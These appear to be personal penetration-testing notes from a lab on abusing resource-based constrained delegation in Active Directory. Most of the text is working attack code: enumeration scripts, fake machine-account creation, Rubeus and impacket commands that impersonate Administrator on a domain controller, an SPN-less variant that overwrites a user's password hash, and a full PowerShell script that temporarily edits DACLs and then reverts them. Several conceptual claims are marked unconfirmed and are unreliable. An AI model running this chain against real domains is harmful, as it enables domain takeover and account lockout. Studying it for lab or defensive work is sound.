- `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and “`PrincipalsAllowedToDelegateToAccount`” AD properties are almost interchangeable. idk the difference.
- Domain admin/equivalent rights **are not needed** to modify this field, as opposed to previous forms of delegation. The only right needed is the ability to edit this property on a computer object in Active Directory, so rights like `GenericAll`/`GenericWrite`/`WriteDacl`/`WriteProperty`/etc. against the target computer or user account with SPN object all apply here.
- RBCD enables us to impersonate any user because it enable us to use S4u2self in all condition despite of protocol transition.
- **NOT CONFIRMED**: when we set RBCD on target computer, we put list of trusted **computers** not list of trusted **SPNs**, so we can impersonate any user using any service in the delegator computer.
- **NOT CONFIRMED**: If i didn't specify the service in SPN `<service>/hostname` that mean i have delegation to all services that are listed on RBCD server, ==THATS DANGER== because if the server has constrained/ unconstrained delegation to other services and we created RBCD on this server, the one who got the delegation right will be able to use those constrained/unconstrained delegations too.
  in other words, if you managed to put `RBCD`on computer that will make you inherite its delegations.
- In **SPN less**, changing password after getting TGT or after doing S4u2self doesn't matter, its the same thing you can do what ever you want but changing after getting tgt is much more simpler.

---
## Enumeration
```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null } |
    Select-Object Name, DistinguishedName, msDS-AllowedToActOnBehalfOfOtherIdentity
```

This script enumerate for any `GenericAll`/`GenericWrite`/`WriteDacl`/`WriteProperty` on any computer or user account that has SPN.
```ldap
# Define rights we care about
$wantedRights = @(
    [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
    [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl
)

# Get all domain users & groups with their SIDs cached
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$forest = $domain.GetDirectoryEntry()

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = $forest
$searcher.Filter = "(&(|(objectClass=user)(objectClass=group))(sAMAccountName=*))"
$searcher.PageSize = 2000
$searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
$searcher.PropertiesToLoad.Add("objectSID") | Out-Null

$users = @{}
foreach ($obj in $searcher.FindAll()) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier ($obj.Properties.objectsid[0],0)
    $sam = $obj.Properties.samaccountname[0]
    $users[$sid.Value] = $sam
}

# Search all computers
$compSearcher = New-Object System.DirectoryServices.DirectorySearcher
$compSearcher.SearchRoot = $forest
$compSearcher.Filter = "(objectClass=computer)"
$compSearcher.PageSize = 2000
$compSearcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$compSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$compSearcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity") | Out-Null # RBCD indicator

foreach ($c in $compSearcher.FindAll()) {

    $dn = $c.Properties.distinguishedname[0]
    $comp = [ADSI]"LDAP://$dn"

    # Request the full security descriptor including DACL
    $sd = $comp.psbase.ObjectSecurity

    foreach ($ace in $sd.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier])) {

        if ($wantedRights -contains $ace.ActiveDirectoryRights) {

            $sid = $ace.IdentityReference.Value

            # Resolve SID -> SAM name if possible
            if ($users.ContainsKey($sid)) {
                $name = $users[$sid]
            } else {
                try {
                    $name = (New-Object System.Security.Principal.SecurityIdentifier $sid).Translate([System.Security.Principal.NTAccount]).Value
                } catch { $name = $sid }
            }

            Write-Host "[+] $name has $($ace.ActiveDirectoryRights) rights on $($c.Properties.samaccountname[0])"
        }
    }
}

```

### Add computer and put RBCD
```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

[+] Machine account HACKTHEBOX added

Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

---
## Windows
```powershell
# Note: We can also use `/altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm` to include aditional services to our ticket request.
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
```
### MachineAccoutQuota > 0
```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
```

### SPN-less
```powershell 
# rc4 is the hash of the user, rubeus automate the process of spn less attack. including extracting the TGT session key and temporarily changing the user's password hash to match it (via internal calls like SamrChangePasswordUser). Keep in mind this will render the account inaccessible afterward until the hash is reset, as the original password is overwritten.Keep in mind this will render the account inaccessible afterward until the hash is reset, as the original password is overwritten.
Rubeus.exe s4u /u2u /user:charlie /domain:domain.local /dc:primarydc.domain.local /rc4:79bf93c9501b151506adc21ba0397b33 /impersonateuser:Administrator /msdsspn:cifs/WIN10TEST.domain.local
```
---
## Linux
### When MachineAccountQuota > 0
```sh
addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes # create fake computer account
python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd # Add fake account to trusted list 
getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
```


### When MachineAccountQuota = 0
```sh
# NOTE: we used the hash here to get smaller session key if we used the password we would have get aes256 key, which is too big and can't be put as hash in DC.
getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35 

describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : 7c3d8b8b135c7d574e423dcd826cab58

changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash :7c3d8b8b135c7d574e423dcd826cab58

KRB5CCNAME=<ccache> impacket-getST -u2u -impersonate Administrator -spn TERMSRV/<RBCD machine> -no-pass <DOMAIN>/<user> -dc-ip <DC IP>
```

---
### Delegations inheritance
If `delagator$` has constrained delegation on `DC01$`, and `delegator$` doesn't have protocol transition enbled then it can't use S4U2Self. so we use `RBCD` it will enable us to ask ticket for anyone.
So, we will get TGS of administrator on `delegator$` then use this TGS as evidance to KDC that administrator tried to access delegator$ then use it as additional ticket so we can get TGS on `DC01$`.
```sh
delegator$ ---Admin---> DC01$ # This can't happen because S4U2Self is disabled.
computer01$  ---Admin---> Delegator$ ---->  DC01$   # this will work 
```

```powershell
$Domain = "INLANEFREIGHT.LOCAL"
$DC = "dc01.inlanefreight.local"
$FakeComputer = 'FakePC$'
$FakePassword = 'FakeP@ss123!'
$User = 'INLANEFREIGHT\carole.holmes'
$Pass = "Y3t4n0th3rP4ssw0rd"
$Target = "dc01" # system to give RBCD, can be computer or user

# Derive domain DN
$domainDN = "DC=" + ($Domain -replace '\.', ',DC=')

# Derive fake computer name without $
$fakeNameWithoutDollar = $FakeComputer -replace '\$', ''

# Bind to computers container with credentials
$computersPath = "LDAP://$DC/CN=Computers,$domainDN"
$computersContainer = New-Object System.DirectoryServices.DirectoryEntry($computersPath, $User, $Pass)

# Create new computer object
$newComputer = $computersContainer.Create("computer", "CN=$fakeNameWithoutDollar")

# Set required attributes
$newComputer.Put("samAccountName", $FakeComputer)
$newComputer.Put("userAccountControl", 4096) # WORKSTATION_TRUST_ACCOUNT
$newComputer.Put("servicePrincipalName", "HOST/$fakeNameWithoutDollar") # Add SPN for delegation

# Save the new computer without password
$newComputer.CommitChanges()

# Now set the password
$passBytes = [System.Text.Encoding]::Unicode.GetBytes('"' + $FakePassword + '"')
$newComputer.Put("unicodePwd", $passBytes)
$newComputer.CommitChanges()

# Get the SID of the new computer
$fakeSidBytes = $newComputer.objectSid
$fakeSid = (New-Object System.Security.Principal.SecurityIdentifier($fakeSidBytes, 0)).Value

# Find the target DN dynamically
$searchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DC/$domainDN", $User, $Pass)
$searcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)
$searcher.Filter = "(|(samAccountName=$Target)(samAccountName=$($Target+'$')))"
$searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$searcher.PropertiesToLoad.Add("objectSid") | Out-Null
$result = $searcher.FindOne()

if ($result -eq $null) {
    throw "Target '$Target' not found."
}

$targetDN = $result.Properties["distinguishedname"][0]
$targetEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DC/$targetDN", $User, $Pass)

# Prepare the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
$adminSid = New-Object System.Security.Principal.SecurityIdentifier "S-1-5-32-544"
$fakeIdentity = New-Object System.Security.Principal.SecurityIdentifier $fakeSid

$sd = New-Object System.DirectoryServices.ActiveDirectorySecurity

$existing = $targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value
if ($existing) {
    $sd.SetSecurityDescriptorBinaryForm($existing)
} else {
    $sd.SetOwner($adminSid)
    $sd.SetGroup($adminSid)
}

# Add the access rule for GenericAll
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $fakeIdentity, [System.DirectoryServices.ActiveDirectoryRights]::GenericAll, [System.Security.AccessControl.AccessControlType]::Allow
$sd.AddAccessRule($rule)

# Get binary form
$sdBytes = $sd.GetSecurityDescriptorBinaryForm()

# Try direct modification
try {
    $targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $sdBytes
    $targetEntry.CommitChanges()
    Write-Output "Direct modification succeeded. Fake computer '$FakeComputer' added to msDS-AllowedToActOnBehalfOfOtherIdentity on '$Target'."
} catch {
    if ($_.Exception.Message -match "access.*denied") {
        # Fallback to WriteDacl method: temporarily grant WriteProperty on the specific attribute
        Write-Output "Direct modification failed (access denied). Attempting WriteDacl method..."

        # Get attacker's SID
        $attackerUser = ($User -split '\\')[1]
        $attackerSearcher = New-Object System.DirectoryServices.DirectorySearcher($searchRoot)
        $attackerSearcher.Filter = "(samAccountName=$attackerUser)"
        $attackerSearcher.PropertiesToLoad.Add("objectSid") | Out-Null
        $attackerResult = $attackerSearcher.FindOne()
        if ($attackerResult -eq $null) {
            throw "Attacker user '$attackerUser' not found."
        }
        $attackerSidBytes = $attackerResult.Properties["objectsid"][0]
        $attackerSid = New-Object System.Security.Principal.SecurityIdentifier($attackerSidBytes, 0)

        # Get original nTSecurityDescriptor
        $targetEntry.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        $ntsdBytes = $targetEntry.Properties["nTSecurityDescriptor"].Value
        $originalSD = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $originalSD.SetSecurityDescriptorBinaryForm($ntsdBytes)

        # GUID for msDS-AllowedToActOnBehalfOfOtherIdentity
        $propertyGuid = New-Object Guid "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"

        # Create ACE for WriteProperty on the specific attribute
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (
            $attackerSid,
            [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $propertyGuid
        )

        # Add ACE to DACL and set
        $originalSD.AddAccessRule($ace)
        $newNtsdBytes = $originalSD.GetSecurityDescriptorBinaryForm()
        $targetEntry.Properties["nTSecurityDescriptor"].Value = $newNtsdBytes
        $targetEntry.CommitChanges()

        # Now perform the modification
        $targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $sdBytes
        $targetEntry.CommitChanges()

        # Revert DACL to original
        $targetEntry.Properties["nTSecurityDescriptor"].Value = $ntsdBytes
        $targetEntry.CommitChanges()

        Write-Output "WriteDacl method succeeded. Fake computer '$FakeComputer' added to msDS-AllowedToActOnBehalfOfOtherIdentity on '$Target'."
    } else {
        throw $_
    }
}
```